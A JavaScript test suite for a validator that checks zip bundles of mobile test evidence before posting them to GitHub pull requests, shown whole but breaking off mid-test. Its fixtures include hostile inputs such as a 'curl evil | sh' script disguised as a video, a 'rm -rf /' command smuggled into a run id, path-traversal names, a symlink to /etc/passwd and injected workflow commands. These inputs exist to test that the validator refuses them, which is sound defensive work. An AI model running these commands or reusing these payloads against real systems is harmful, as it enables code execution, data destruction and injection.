import assert from 'node:assert/strict';
import { createHash } from 'node:crypto';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import zlib from 'node:zlib';

import { describe, it } from 'vitest';

import {
  downloadArtifact,
  evidenceBlock,
  evidenceMarkers,
  fetchStep,
  LIMITS,
  listZip,
  main,
  parseManifest,
  publishStep,
  pullRequestMismatch,
  Refused,
  sessionRunMismatch,
  validateBundle,
  withEvidenceBlock,
  workflowCommand,
} from './verify-attach.mjs';

const sha256 = data => createHash('sha256').update(data).digest('hex');
const COMMIT = '0f50b597b1c2d3e4f5a60718293a4b5c6d7e8f90';
const REPO = 'clerk/clerk-ios';
const PNG = Buffer.concat([
  Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]),
  Buffer.from('the rest of a screenshot'),
]);
const JPG = Buffer.concat([Buffer.from([0xff, 0xd8, 0xff, 0xe0]), Buffer.from('the rest of a photo')]);
const MP4 = Buffer.concat([Buffer.from([0, 0, 0, 0x18]), Buffer.from('ftypmp42'), Buffer.alloc(4096, 'v')]);

const manifestFor = (files, change = {}) => ({
  v: 1,
  pr: 669,
  run: 'r20261008-052713-253e',
  platform: 'ios',
  device: 'iPhone Air on xcode-27',
  commit: COMMIT,
  passed: 3,
  flaky: 0,
  total: 3,
  files: files.map(([name, data]) => ({ name, bytes: data.length, sha256: sha256(data) })),
  ...change,
});

const MEDIA = [
  ['video.mp4', MP4],
  ['profile.png', PNG],
];
const GOOD = manifestFor(MEDIA);

// A zip writer that can also write what an honest tool never would. `entry.central` and `entry.local` replace header fields by name.
function zip(entries, { trailing = Buffer.alloc(0), count, disk = 0 } = {}) {
  const locals = [];
  const centrals = [];
  let offset = 0;
  for (const entry of entries) {
    const method = entry.method ?? 8;
    const packed = entry.packed ?? (method === 8 ? zlib.deflateRawSync(entry.data) : entry.data);
    const fields = {
      madeBy: (3 << 8) | 20,
      flags: 0,
      method,
      crc: zlib.crc32(entry.data),
      packedBytes: packed.length,
      bytes: entry.data.length,
      name: entry.name,
      attributes: (entry.mode ?? 0o100644) * 65536,
      offset,
      ...entry.central,
    };
    const localFields = { ...fields, ...entry.local };
    const header = (f, central) => {
      const name = Buffer.from(f.name, 'latin1');
      const head = Buffer.alloc(central ? 46 : 30);
      head.writeUInt32LE(central ? 0x02014b50 : 0x04034b50, 0);
      let at = 4;
      if (central) {
        at = head.writeUInt16LE(f.madeBy, at);
      }
      at = head.writeUInt16LE(20, at);
      at = head.writeUInt16LE(f.flags, at);
      at = head.writeUInt16LE(f.method, at);
      at = head.writeUInt32LE(0, at);
      at = head.writeUInt32LE(f.crc, at);
      at = head.writeUInt32LE(f.packedBytes, at);
      at = head.writeUInt32LE(f.bytes, at);
      at = head.writeUInt16LE(name.length, at);
      at = head.writeUInt16LE(0, at);
      if (central) {
        at = head.writeUInt16LE(0, at);
        at = head.writeUInt16LE(0, at);
        at = head.writeUInt16LE(0, at);
        at = head.writeUInt32LE(f.attributes >>> 0, at);
        head.writeUInt32LE(f.offset, at);
      }
      return Buffer.concat([head, name]);
    };
    const local = Buffer.concat([header(localFields, false), packed]);
    locals.push(local);
    centrals.push(header(fields, true));
    offset += local.length;
  }
  const directory = Buffer.concat(centrals);
  const end = Buffer.alloc(22);
  end.writeUInt32LE(0x06054b50, 0);
  end.writeUInt16LE(disk, 4);
  end.writeUInt16LE(count ?? entries.length, 8);
  end.writeUInt16LE(count ?? entries.length, 10);
  end.writeUInt32LE(directory.length, 12);
  end.writeUInt32LE(offset, 16);
  return Buffer.concat([...locals, directory, trailing, end]);
}

const bundle = (manifest = GOOD, media = MEDIA, extra = []) =>
  zip([
    { name: 'manifest.json', data: Buffer.from(JSON.stringify(manifest)) },
    ...media.map(([name, data]) => ({ name, data })),
    ...extra,
  ]);
const refusal = attempt => {
  try {
    attempt();
  } catch (error) {
    if (error instanceof Refused) {
      return error.message;
    }
    throw error;
  }
  return null;
};

describe('the archive of a session', () => {
  it('accepts a manifest with the files it names, deflated or stored, and returns their bytes', () => {
    for (const method of [8, 0]) {
      const accepted = validateBundle(
        zip([
          { name: 'manifest.json', data: Buffer.from(JSON.stringify(GOOD)), method },
          { name: 'video.mp4', data: MP4, method },
          { name: 'profile.png', data: PNG, method },
        ]),
      );
      assert.deepEqual(accepted.manifest, GOOD);
      assert.deepEqual(accepted.files, [
        { name: 'video.mp4', data: MP4 },
        { name: 'profile.png', data: PNG },
      ]);
    }
    const jpg = manifestFor([['photo.jpg', JPG]]);
    assert.deepEqual(validateBundle(bundle(jpg, [['photo.jpg', JPG]])).files, [{ name: 'photo.jpg', data: JPG }]);
  });

  it('reads sizes from the directory, as a zip written to a stream needs', () => {
    const streamed = (name, data) => ({
      name,
      data,
      central: { flags: 8 },
      local: { flags: 8, crc: 0, packedBytes: 0, bytes: 0 },
    });
    const accepted = validateBundle(
      zip([
        streamed('manifest.json', Buffer.from(JSON.stringify(GOOD))),
        streamed('video.mp4', MP4),
        streamed('profile.png', PNG),
      ]),
    );
    assert.deepEqual(
      accepted.files.map(file => file.name),
      ['video.mp4', 'profile.png'],
    );
  });

  const withEntry = entry => bundle(GOOD, MEDIA, [entry]);
  const refusedArchives = [
    ['bytes that are not a zip', Buffer.from('<html>not an archive</html>'), /not a zip archive/],
    ['an empty file', Buffer.alloc(0), /not a zip archive/],
    [
      'a path under a directory',
      withEntry({ name: 'screenshots/profile.png', data: PNG }),
      /entry 4 has a name that is not allowed/,
    ],
    [
      'a path that climbs out',
      withEntry({ name: '../../home/runner/.bashrc.png', data: PNG }),
      /entry 4 has a name that is not allowed/,
    ],
    ['an absolute path', withEntry({ name: '/etc/cron.d/x.png', data: PNG }), /entry 4 has a name that is not allowed/],
    ['a Windows path', withEntry({ name: '..\\x.png', data: PNG }), /entry 4 has a name that is not allowed/],
    [
      'a directory',
      withEntry({ name: 'shots/', data: Buffer.alloc(0), method: 0 }),
      /entry 4 has a name that is not allowed/,
    ],
    [
      'a script',
      withEntry({ name: 'run.sh', data: Buffer.from('#!/bin/sh\n') }),
      /entry 4 has a name that is not allowed/,
    ],
    [
      'a web page',
      withEntry({ name: 'page.html', data: Buffer.from('<script>') }),
      /entry 4 has a name that is not allowed/,
    ],
    [
      'an SVG',
      withEntry({ name: 'drawing.svg', data: Buffer.from('<svg onload="x">') }),
      /entry 4 has a name that is not allowed/,
    ],
    ['a hidden file', withEntry({ name: '.env.png', data: PNG }), /entry 4 has a name that is not allowed/],
    [
      'a name that reads as a flag',
      withEntry({ name: '--body-file.png', data: PNG }),
      /entry 4 has a name that is not allowed/,
    ],
    [
      'a name with a newline',
      withEntry({ name: 'a\n::set-output name=x::y.png', data: PNG }),
      /entry 4 has a name that is not allowed/,
    ],
    [
      'a symbolic link',
      withEntry({ name: 'link.png', data: Buffer.from('/etc/passwd'), mode: 0o120777, method: 0 }),
      /entry 4 is not a regular file/,
    ],
    ['an encrypted entry', withEntry({ name: 'secret.png', data: PNG, central: { flags: 1 } }), /entry 4 is encrypted/],
    [
      'a strongly encrypted entry',
      withEntry({ name: 'secret.png', data: PNG, central: { flags: 0x40 } }),
      /entry 4 is encrypted/,
    ],
    [
      'a directory by its DOS attribute',
      withEntry({ name: 'folder.png', data: PNG, central: { madeBy: 20, attributes: 0x10 } }),
      /entry 4 is not a regular file/,
    ],
    [
      'an archive that spans disks',
      zip([{ name: 'manifest.json', data: Buffer.from('{}') }], { disk: 1 }),
      /spans disks/,
    ],
    [
      'entries within their caps that unpack to more than the total',
      zip(
        Array.from({ length: 17 }, (_, i) => ({ name: `s${i}.png`, data: PNG, central: { bytes: LIMITS.imageBytes } })),
      ),
      /unpacks to more than 157286400 bytes/,
    ],
    [
      'a compression method other than deflate',
      withEntry({ name: 'odd.png', data: PNG, central: { method: 12 } }),
      /entry 4 uses a compression method/,
    ],
    ['two entries with one name', bundle(GOOD, [...MEDIA, ['Profile.png', PNG]]), /entry 4 repeats a name/],
    [
      'an image that declares more than its cap',
      withEntry({ name: 'huge.png', data: PNG, central: { bytes: LIMITS.imageBytes + 1 } }),
      /entry 4 is over the size cap for its kind/,
    ],
    [
      'a manifest that declares more than its cap',
      zip([{ name: 'manifest.json', data: Buffer.from('{}'), central: { bytes: LIMITS.manifestBytes + 1 } }]),
      /entry 1 is over the size cap/,
    ],
    [
      'more entries than the cap',
      zip(Array.from({ length: LIMITS.files + 2 }, (_, i) => ({ name: `s${i}.png`, data: PNG }))),
      /more than 51 entries/,
    ],
    ['a zip64 archive', zip([{ name: 'manifest.json', data: Buffer.from('{}') }], { count: 0xffff }), /zip64/],
    ['a manifest that names no file', bundle(manifestFor([]), []), /files must be a list of 1 to 50/],
    [
      'bytes hidden between the directory and the end record',
      zip([{ name: 'manifest.json', data: Buffer.from(JSON.stringify(GOOD)) }], {
        trailing: Buffer.from('hidden'),
      }),
      /bytes between its directory and its end record/,
    ],
    [
      'a stored entry with two sizes',
      withEntry({ name: 'odd.png', data: PNG, method: 0, central: { bytes: PNG.length + 1 } }),
      /stored with two different sizes/,
    ],
  ];
  for (const [what, archive, message] of refusedArchives) {
    it(`refuses ${what}`, () => {
      assert.match(refusal(() => validateBundle(archive)) ?? 'accepted', message);
    });
  }

  it('refuses an entry that inflates past the size its directory declares, before it holds the bytes', () => {
    const bomb = Buffer.alloc(8 * 1024 * 1024);
    const lying = manifestFor([['profile.png', PNG]]);
    const archive = zip([
      { name: 'manifest.json', data: Buffer.from(JSON.stringify(lying)) },
      { name: 'profile.png', data: PNG, packed: zlib.deflateRawSync(bomb), central: { bytes: PNG.length } },
    ]);
    assert.match(
      refusal(() => validateBundle(archive)),
      /inflates past the size the directory declares/,
    );
    const short = zip([
      { name: 'manifest.json', data: Buffer.from(JSON.stringify(lying)) },
      {
        name: 'profile.png',
        data: PNG,
        packed: zlib.deflateRawSync(PNG.subarray(0, 8)),
        central: { bytes: PNG.length },
      },
    ]);
    assert.match(
      refusal(() => validateBundle(short)),
      /does not inflate to the size the directory declares/,
    );
  });

  it('refuses an entry whose bytes fail the checksum, and one named differently beside its bytes', () => {
    const one = manifestFor([['profile.png', PNG]]);
    const corrupt = zip([
      { name: 'manifest.json', data: Buffer.from(JSON.stringify(one)) },
      { name: 'profile.png', data: PNG, central: { crc: 1 } },
    ]);
    assert.match(
      refusal(() => validateBundle(corrupt)),
      /fails its checksum/,
    );
    const twoNames = zip([
      { name: 'manifest.json', data: Buffer.from(JSON.stringify(one)) },
      { name: 'profile.png', data: PNG, local: { name: 'run.sh\0\0\0\0\0' } },
    ]);
    assert.match(
      refusal(() => validateBundle(twoNames)),
      /one name in the directory and another beside its bytes/,
    );
  });

  it('refuses an archive with no manifest, with a file the manifest does not name, and without a file it does name', () => {
    assert.match(
      refusal(() => validateBundle(zip([{ name: 'video.mp4', data: MP4 }]))),
      /has no manifest\.json/,
    );
    assert.match(
      refusal(() => validateBundle(bundle(GOOD, [...MEDIA, ['extra.png', PNG]]))),
      /name different files/,
    );
    assert.match(
      refusal(() => validateBundle(bundle(GOOD, [MEDIA[0]]))),
      /name different files/,
    );
    assert.match(
      refusal(() => validateBundle(bundle(GOOD, [MEDIA[0], ['other.png', PNG]]))),
      /name different files/,
    );
  });

  it('refuses a file that is not the size or the sha256 its manifest declares', () => {
    const wrongSize = manifestFor(MEDIA, { files: [GOOD.files[0], { ...GOOD.files[1], bytes: PNG.length + 1 }] });
    assert.match(
      refusal(() => validateBundle(bundle(wrongSize))),
      /file 2 is not the size its manifest declares/,
    );
    const wrongSha = manifestFor(MEDIA, { files: [GOOD.files[0], { ...GOOD.files[1], sha256: sha256('other') }] });
    assert.match(
      refusal(() => validateBundle(bundle(wrongSha))),
      /file 2 does not have the sha256 its manifest declares/,
    );
  });

  it('refuses a file whose leading bytes are not those of its type', () => {
    for (const [name, data] of [
      ['page.png', Buffer.from('<html><script>alert(1)</script></html>')],
      ['clip.mp4', Buffer.from('#!/bin/sh\ncurl evil | sh\n')],
      ['photo.jpg', PNG],
      ['shot.png', JPG],
      ['tiny.mp4', Buffer.from('ftyp')],
    ]) {
      assert.match(
        refusal(() => validateBundle(bundle(manifestFor([[name, data]]), [[name, data]]))),
        /file 1 does not start with the bytes of its type/,
        name,
      );
    }
  });

  it('never repeats a name or a value from the archive in what it says', () => {
    const hostile = 'x\n::error::pwned`$(id)`.png';
    const message = refusal(() => validateBundle(bundle(GOOD, MEDIA, [{ name: hostile, data: PNG }])));
    assert.equal(message.includes('pwned'), false);
    assert.equal(
      refusal(() => parseManifest(JSON.stringify({ ...GOOD, device: '::error::pwned' }))).includes('pwned'),
      false,
    );
    assert.equal(
      refusal(() =>
        parseManifest(JSON.stringify({ ...GOOD, files: [{ ...GOOD.files[0], name: 'pwned/../x.png' }] })),
      ).includes('pwned'),
      false,
    );
  });

  it('refuses an archive over the size cap before it reads it', () => {
    const cap = LIMITS.zipBytes;
    LIMITS.zipBytes = 64;
    try {
      assert.match(
        refusal(() => listZip(bundle())),
        /the archive is over 64 bytes/,
      );
    } finally {
      LIMITS.zipBytes = cap;
    }
  });

  it('lists entries without reading their bytes', () => {
    assert.deepEqual(
      listZip(bundle()).entries.map(entry => [entry.name, entry.bytes]),
      [
        ['manifest.json', JSON.stringify(GOOD).length],
        ['video.mp4', MP4.length],
        ['profile.png', PNG.length],
      ],
    );
  });
});

describe('the manifest', () => {
  const parse = change => parseManifest(JSON.stringify({ ...GOOD, ...change }));
  const file = change => parse({ files: [{ ...GOOD.files[1], ...change }] });

  it('accepts the manifest the CLI writes', () => {
    assert.deepEqual(parseManifest(JSON.stringify(GOOD)), GOOD);
  });

  const refused = [
    ['text that is not JSON', () => parseManifest('{')],
    ['a list', () => parseManifest('[]')],
    ['another version', () => parse({ v: 2 })],
    ['a key the schema does not have', () => parse({ note: 'free text for the description' })],
    ['a missing key', () => parseManifest(JSON.stringify({ ...GOOD, device: undefined }))],
    ['a run id of another shape', () => parse({ run: 'r20261008-052713-253e`; rm -rf /' })],
    ['a run id with a newline after it', () => parse({ run: 'r20261008-052713-253e\n' })],
    ['a PR number that is text', () => parse({ pr: '669' })],
    ['a PR number that is not whole', () => parse({ pr: 6.5 })],
    ['a PR number of zero', () => parse({ pr: 0 })],
    ['a PR number past the cap', () => parse({ pr: LIMITS.pr + 1 })],
    ['a third platform', () => parse({ platform: 'web' })],
    ['a device with markdown in it', () => parse({ device: 'iPhone `Air` [x](http://evil)' })],
    ['a device with a comment marker in it', () => parse({ device: 'x <!-- /verify-evidence:ios -->' })],
    ['a short commit', () => parse({ commit: 'abc1234' })],
    ['a negative count', () => parse({ passed: -1 })],
    ['no passing test', () => parse({ passed: 0, flaky: 0 })],
    ['more passing tests than tests', () => parse({ passed: 4 })],
    ['a count past the cap', () => parse({ total: LIMITS.tests + 1 })],
    ['files that are not a list', () => parse({ files: 'video.mp4' })],
    ['no file, which would put a line of claims in the description and nothing to look at', () => parse({ files: [] })],
    [
      'more files than the cap',
      () =>
        parse({ files: Array.from({ length: LIMITS.files + 1 }, (_, i) => ({ ...GOOD.files[1], name: `s${i}.png` })) }),
    ],
    ['two videos', () => parse({ files: [GOOD.files[0], { ...GOOD.files[0], name: 'second.mp4' }] })],
    ['two files with one name', () => parse({ files: [GOOD.files[1], { ...GOOD.files[1], name: 'PROFILE.png' }] })],
    ['a name with a path separator', () => file({ name: '../profile.png' })],
    ['a name with a backslash', () => file({ name: 'a\\profile.png' })],
    ['a name that starts with a dot', () => file({ name: '.profile.png' })],
    ['a name that starts with a dash', () => file({ name: '-profile.png' })],
    ['a name with a space', () => file({ name: 'my profile.png' })],
    ['a name with a bracket', () => file({ name: 'a](http://evil).png' })],
    ['a name with a number sign, which gh reads as alt text', () => file({ name: 'a#b.png' })],
    ['an extension outside png, jpg, mp4', () => file({ name: 'profile.gif' })],
    ['an extension in capitals', () => file({ name: 'profile.PNG' })],
    ['a name with no extension', () => file({ name: 'profile' })],
    ['a name that is too long', () => file({ name: `${'a'.repeat(120)}.png` })],
    ['an empty file', () => file({ bytes: 0 })],
    ['an image over its cap', () => file({ bytes: LIMITS.imageBytes + 1 })],
    ['a video over its cap', () => parse({ files: [{ ...GOOD.files[0], bytes: LIMITS.videoBytes + 1 }] })],
    [
      'files within their caps and over the total',
      () =>
        parse({
          files: [
            { ...GOOD.files[0], bytes: LIMITS.videoBytes },
            ...Array.from({ length: 6 }, (_, i) => ({
              name: `s${i}.png`,
              bytes: LIMITS.imageBytes,
              sha256: sha256('x'),
            })),
          ],
        }),
    ],
    ['a sha256 of another shape', () => file({ sha256: 'abc' })],
    ['a file with a key the schema does not have', () => file({ path: '/etc/passwd' })],
    ['a manifest over its size cap', () => parseManifest(JSON.stringify(GOOD).padEnd(LIMITS.manifestBytes + 1, ' '))],
  ];
  for (const [what, attempt] of refused) {
    it(`refuses ${what}`, () => {
      assert.throws(attempt, Refused);
    });
  }
});

describe('which runs and which pull request', () => {
  const session = { repo: REPO, headBranch: 'feature/change' };
  const pull = {
    state: 'open',
    head: { ref: 'feature/change', sha: COMMIT, repo: { full_name: REPO } },
    base: { repo: { full_name: REPO } },
  };

  it('takes evidence only from a dispatched run of the session workflow of this repository', () => {
    const run = { event: 'workflow_dispatch', path: '.github/workflows/verify-remote.yml', headRepo: REPO };
    assert.equal(sessionRunMismatch(run, REPO), null);
    assert.equal(sessionRunMismatch({ ...run, event: 'pull_request' }, REPO), 'it was not started by a dispatch');
    assert.equal(
      sessionRunMismatch({ ...run, event: 'pull_request_target' }, REPO),
      'it was not started by a dispatch',
    );
    assert.equal(
      sessionRunMismatch({ ...run, path: '.github/workflows/fork-made.yml' }, REPO),
      'it is not a run of .github/workflows/verify-remote.yml',
    );
    assert.equal(sessionRunMismatch({ ...run, headRepo: 'someone/clerk-ios' }, REPO), 'it ran for another repository');
  });

  it('publishes to the open pull request of the session branch, whatever its head commit is now', () => {
    assert.equal(pullRequestMismatch(pull, session), null);
    assert.equal(pullRequestMismatch({ ...pull, head: { ...pull.head, sha: 'b'.repeat(40) } }, session), null);
  });

  it('publishes to no other pull request, and says which rule refused it', () => {
    assert.equal(pullRequestMismatch({ ...pull, state: 'closed' }, session), 'it is not open');
    assert.equal(
      pullRequestMismatch({ ...pull, head: { ...pull.head, repo: { full_name: 'someone/clerk-ios' } } }, session),
      'its branch is in another repository',
    );
    assert.equal(
      pullRequestMismatch({ ...pull, head: { ...pull.head, repo: null } }, session),
      'its branch is in another repository',
    );
    assert.equal(
      pullRequestMismatch({ ...pull, base: { repo: { full_name: 'clerk/other' } } }, session),
      'its branch is in another repository',
    );
    assert.equal(
      pullRequestMismatch({ ...pull, head: { ...pull.head, ref: 'main' } }, session),
      'its branch is not the branch the session ran on',
    );
    assert.equal(pullRequestMismatch(null, session), 'it is not open');
    assert.equal(pullRequestMismatch({ message: 'Not Found' }, session), 'it is not open');
  });
});

const SESSION = { repo: REPO, runId: '37731397352', actor: 'octocat', pullHead: COMMIT };
const blockOf = (manifest, onDisk) => evidenceBlock(manifest, SESSION, onDisk);
const LOCAL_BLOCK = [
  '<!-- verify-evidence:ios -->',
  '',
  'verify run `r20261007-010101-aaaa` on `iPhone 17 Pro` at `0f50b597b1c2`, 3 of 3 passed.',
  '',
  '![video.mp4](https://github.com/user-attachments/assets/1)',
  '',
  '<!-- /verify-evidence:ios -->',
].join('\n');

describe('the evidence block of a pull request description', () => {
  const block = blockOf(GOOD);

  it('is one line that says the session reported the result, links its run and names who started it, then each file alone in its own paragraph, between the markers of its platform', () => {
    assert.equal(
      block,
      [
        '<!-- verify-evidence:ios -->',
        '',
        'verify run `r20261008-052713-253e`, as reported by [the session](https://github.com/clerk/clerk-ios/actions/runs/37731397352) that `octocat` started: 3 of 3 passed on `iPhone Air on xcode-27` at `0f50b597b1c2`.',
        '',
        '![video.mp4](./video.mp4)',
        '',
        '![profile](./profile.png)',
        '',
        '<!-- /verify-evidence:ios -->',
      ].join('\n'),
    );
    assert.match(
      blockOf(manifestFor(MEDIA, { passed: 1, flaky: 1, total: 2 })),
      / started: 1 of 2 passed, 1 flaky \(passed only on a retry\), on `iPhone Air on xcode-27` at `0f50b597b1c2`\.$/m,
    );
  });

  it('says that the pull request has newer commits when its head is not the commit of the run', () => {
    const moved = evidenceBlock(GOOD, { ...SESSION, pullHead: 'b'.repeat(40) });
    assert.match(moved, / at `0f50b597b1c2`\. The pull request has newer commits\.$/m);
    assert.equal(block.includes('newer commits'), false);
  });

  it('links the run and names the person GitHub names, whatever the manifest says', () => {
    const elsewhere = evidenceBlock(GOOD, {
      repo: 'clerk/clerk-android',
      runId: '41',
      actor: 'someone-else',
      pullHead: COMMIT,
    });
    assert.ok(
      elsewhere.includes(
        '](https://github.com/clerk/clerk-android/actions/runs/41) that `someone-else` started: 3 of 3 passed',
      ),
    );
    assert.equal(/actions\/runs|octocat|someone-else/.test(JSON.stringify(GOOD)), false);
  });

  it('replaces the block that attach writes from a machine whose gh can attach', () => {
    assert.equal(withEvidenceBlock(`intro\n\n${LOCAL_BLOCK}\n`, 'ios', block).body, `intro\n\n${block}\n`);
  });

  it('goes after a description that has no block, and leaves that description as it was', () => {
    for (const body of ['## Summary\r\n\r\nFixes the button.  \r\n', 'no newline at the end', 'ends with one\n']) {
      const edit = withEvidenceBlock(body, 'ios', block);
      assert.ok(edit.ok && edit.was === 'added');
      assert.ok(edit.body.startsWith(body), JSON.stringify(body));
      assert.match(edit.body.slice(body.length), /^(\n{1,2}|(\r\n){1,2})<!-- verify-evidence:ios -->/);
      assert.ok(edit.body.replaceAll('\r\n', '\n').endsWith(block));
    }
    assert.deepEqual(withEvidenceBlock('', 'ios', block), { ok: true, body: block, was: 'added', old: null });
  });

  it('replaces the block that is there and keeps every byte before and after it', () => {
    const before = '## Summary\r\n\r\nText above.  \n\n';
    const after = '\n\n- [x] a checklist\r\n<!-- /verify-evidence:android -->\ttrailing\n';
    const old = blockOf(manifestFor(MEDIA, { run: 'r20261007-010101-aaaa' }));
    const edit = withEvidenceBlock(`${before}${old}${after}`, 'ios', block);
    assert.equal(edit.body, `${before}${block.replaceAll('\n', '\r\n')}${after}`);
    assert.equal(edit.was, 'replaced');
    assert.equal(edit.body.includes('r20261007-010101-aaaa'), false);
  });

  it('keeps the block of the other platform', () => {
    const android = blockOf(manifestFor(MEDIA, { platform: 'android', device: 'Pixel 9' }));
    assert.equal(withEvidenceBlock(`intro\n\n${android}\n`, 'ios', block).body, `intro\n\n${android}\n\n${block}`);
  });

  it('takes a marker only when it is a whole line, so a description may quote one', () => {
    const { start, end } = evidenceMarkers('ios');
    const quoting = `The block sits between \`${start}\` and \`${end}\`.\n\n    ${start}\n    indented, so not a marker\n    ${end}\n`;
    const edit = withEvidenceBlock(quoting, 'ios', block);
    assert.equal(edit.was, 'added');
    assert.equal(edit.body, `${quoting}\n${block}`);
  });

  it('writes the block with the line endings of the description, added or replaced', () => {
    const crlf = block.replaceAll('\n', '\r\n');
    const old = blockOf(manifestFor(MEDIA, { run: 'r20261007-010101-aaaa' })).replaceAll('\n', '\r\n');
    assert.equal(withEvidenceBlock(`intro\r\n\r\n${old}\r\noutro`, 'ios', block).body, `intro\r\n\r\n${crlf}\r\noutro`);
    assert.equal(withEvidenceBlock('intro\r\n', 'ios', block).body, `intro\r\n\r\n${crlf}`);
    assert.equal(withEvidenceBlock('one\r\ntwo', 'ios', block).body, `one\r\ntwo\r\n\r\n${crlf}`);
    assert.equal(
      withEvidenceBlock(`intro\n\n${old.replaceAll('\r\n', '\n')}\n`, 'ios', block).body,
      `intro\n\n${block}\n`,
    );
    for (const body of [`intro\r\n\r\n${old}\r\noutro`, 'intro\r\n']) {
      assert.equal(/[^\r]\n/.test(withEvidenceBlock(body, 'ios', block).body), false, 'no bare line feed');
    }
  });

  it('refuses to replace text between two markers that is not a block it wrote', () => {
    const { start, end } = evidenceMarkers('ios');
    const notes = `${start}\nIMPORTANT reviewer notes that are not evidence\n${end}\n`;
    assert.deepEqual(withEvidenceBlock(notes, 'ios', block), {
      ok: false,
      why: 'has text between the markers that is not an evidence block',
    });
  });

  it('takes no marker from inside a code fence, so a description may show a whole example block', () => {
    const example = blockOf(manifestFor(MEDIA, { run: 'r20261007-010101-aaaa' }));
    for (const [open, close] of [
      ['```', '```'],
      ['```markdown', '```'],
      ['~~~~', '~~~~~'],
      ['   ```', '```  '],
      ['```\n```not the end, it has text after the ticks', '```'],
      ['```\n~~~', '```'],
      ['````\n```', '````'],
    ]) {
      const documented = `The block looks like this:\n\n${open}\n${example}\n${close}\n`;
      const added = withEvidenceBlock(documented, 'ios', block);
      assert.equal(added.was, 'added', open);
      assert.equal(added.body, `${documented}\n${block}`);
      const replaced = withEvidenceBlock(
        added.body,
        'ios',
        blockOf(manifestFor(MEDIA, { run: 'r20261009-020202-bbbb' })),
      );
      assert.equal(replaced.was, 'replaced', open);
      assert.ok(replaced.body.startsWith(documented) && replaced.body.includes('r20261009-020202-bbbb'));
      assert.equal(replaced.body.includes('r20261008-052713-253e'), false);
    }
  });

  it('still takes a marker after a fence that closed, and one beside a line that only looks like a fence', () => {
    const real = blockOf(manifestFor(MEDIA, { run: 'r20261007-010101-aaaa' }));
    for (const before of [
      '```\ncode\n```\n\n',
      'Use ```three ticks``` inline.\n\n',
      '```three ticks``` that open a line are inline code too.\n\n',
      '    ```\n\n',
      '``\n\n',
    ]) {
      const edit = withEvidenceBlock(`${before}${real}\n`, 'ios', block);
      assert.equal(edit.was, 'replaced', JSON.stringify(before));
      assert.equal(edit.body, `${before}${block}\n`);
    }
  });

  it('opens no fence at a fence line inside an HTML comment, so the next run finds the block it wrote', () => {
    for (const hidden of [
      '<!--\n```\n-->\n\nintro\n',
      '<!-- a note\r\n~~~\r\nstill the note -->\r\n',
      'intro\n   <!--\n```\n',
    ]) {
      const added = withEvidenceBlock(hidden, 'ios', block);
      assert.equal(added.was, 'added', JSON.stringify(hidden));
      const again = withEvidenceBlock(added.body, 'ios', blockOf(manifestFor(MEDIA, { run: 'r20261009-020202-bbbb' })));
      assert.equal(again.was, 'replaced', JSON.stringify(hidden));
      assert.equal(again.body.split('<!-- verify-evidence:ios -->').length, 2, 'one block, not two');
      assert.ok(again.body.startsWith(hidden));
    }
    const fencedComment = '```\n<!--\n```\n\n';
    assert.equal(withEvidenceBlock(`${fencedComment}${block}\n`, 'ios', block).was, 'replaced');
  });

  it('refuses a description that ends inside a code fence that never closes, where a block would be code and never found again', () => {
    for (const unclosed of ['intro\n\n```\ncode\n', 'intro\r\n~~~~ js\r\ncode', '```']) {
      assert.deepEqual(
        withEvidenceBlock(unclosed, 'ios', block),
        { ok: false, why: 'ends inside a code fence that is never closed' },
        JSON.stringify(unclosed),
      );
    }
    const earlier = blockOf(manifestFor(MEDIA, { run: 'r20261007-010101-aaaa' }));
    assert.equal(
      withEvidenceBlock(`intro\n\n${earlier}\n\n~~~\ncode\n`, 'ios', block).body,
      `intro\n\n${block}\n\n~~~\ncode\n`,
      'a block before the open fence is still replaced',
    );
  });

  it('refuses a description whose markers are doubled, halved, or out of order, and says which', () => {
    const { start, end } = evidenceMarkers('ios');
    assert.deepEqual(withEvidenceBlock(`${block}\n\n${block}`, 'ios', block), {
      ok: false,
      why: 'has the start marker 2 times and the end marker 2 times',
    });
    assert.deepEqual(withEvidenceBlock(`text\n${start}\nno end`, 'ios', block), {
      ok: false,
      why: 'has the start marker 1 times and the end marker 0 times',
    });
    assert.deepEqual(withEvidenceBlock(`no start\n${end}\n`, 'ios', block), {
      ok: false,
      why: 'has the start marker 0 times and the end marker 1 times',
    });
    assert.deepEqual(withEvidenceBlock(`${end}\n${start}`, 'ios', block), {
      ok: false,
      why: 'has the end marker before the start marker',
    });
  });
});

function workDir() {
  return path.join(fs.mkdtempSync(path.join(os.tmpdir(), 'verify-attach-test-')), 'work');
}

const ENV = {
  REPO,
  RUN_ID: '37731397352',
  RUN_EVENT: 'workflow_dispatch',
  RUN_PATH: '.github/workflows/verify-remote.yml',
  RUN_HEAD_REPO: REPO,
  HEAD_BRANCH: 'feature/change',
  HEAD_SHA: COMMIT,
  RUN_ACTOR: 'octocat',
};

describe('the step that fetches the evidence', () => {
  const artifact = (id, change = {}) => ({
    id,
    name: 'verify-evidence',
    size_in_bytes: 100,
    expired: false,
    ...change,
  });
  function github(artifacts, zipBytes = bundle()) {
    const calls = [];
    const fetch = (url, init) => {
      calls.push({ url, authorization: init.headers.Authorization });
      return Promise.resolve(url.includes('/artifacts?') ? Response.json({ artifacts }) : new Response(zipBytes));
    };
    return { fetch, calls };
  }
  const download = hub =>
    downloadArtifact({
      fetch: hub.fetch,
      api: 'https://api.github.test',
      token: 'actions-token',
      repo: REPO,
      runId: '37731397352',
    });

  it('downloads the newest verify-evidence artifact of the run, and no other artifact', async () => {
    const hub = github([
      artifact(5),
      artifact(9),
      artifact(7, { expired: true }),
      artifact(11, { name: 'verify-evidence-logs' }),
    ]);
    assert.deepEqual(await download(hub), bundle());
    assert.deepEqual(
      hub.calls.map(call => call.url),
      [
        'https://api.github.test/repos/clerk/clerk-ios/actions/runs/37731397352/artifacts?name=verify-evidence&per_page=100',
        'https://api.github.test/repos/clerk/clerk-ios/actions/artifacts/9/zip',
      ],
    );
    assert.deepEqual(
      hub.calls.map(call => call.authorization),
      ['Bearer actions-token', 'Bearer actions-token'],
    );
  });

  it('finds nothing when the run kept no evidence', async () => {
    assert.equal(await download(github([])), null);
    assert.equal(await download(github([artifact(1, { expired: true })])), null);
  });

  it('refuses an artifact over the size cap by its listed size, and again while it downloads', async () => {
    const listedTooBig = github([artifact(1, { size_in_bytes: LIMITS.zipBytes + 1 })]);
    await assert.rejects(download(listedTooBig), Refused);
    assert.equal(listedTooBig.calls.length, 1, 'nothing was downloaded');
